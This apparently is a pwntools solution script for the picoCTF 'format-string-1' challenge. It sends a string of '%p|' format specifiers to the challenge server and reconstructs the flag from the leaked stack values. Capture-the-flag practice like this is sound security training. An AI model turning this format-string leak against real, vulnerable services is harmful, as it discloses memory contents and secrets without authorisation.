from pwn import *

context.binary = ELF("format-string-1")

print(context.binary)
print(hex(context.binary.symbols['main']))
flag_location = context.binary.symbols['main'] + 1024 + 64
flag_hex = hex(flag_location)
print(flag_hex)

# Correct payload formatting
payload = b''
for i in range(1, 21):
    payload += f"%p|".encode()  # use $ to access stack args directly
# send payload to server
print("Payload:", payload)
p = remote('mimas.picoctf.net', 52587)
val = p.recv()
print(val)
p.sendline(payload)
val = p.recv()
# print server response
print(val)
# remove fluff before hexvalues
val = val.decode().split(":")[1]
# separate hexvalues
hexValues = val.split(sep='|')
flag_found = False
flag = b''
for hexValue in hexValues:
    # technically skips the first entry, but don't worry about it.
    if hexValue.startswith("0x"):
        hexValue = hexValue[2:]
        byteValue = unhex(hexValue)
        byteValue = byteValue[::-1]
        print(byteValue)
        # Yay! we found the flag!
        if b'picoCTF' in byteValue:
            flag_found = True
        # Now we concat until the end of the flag
        if(flag_found):
            flag += byteValue
            if b'}' in byteValue:
                break
print(flag)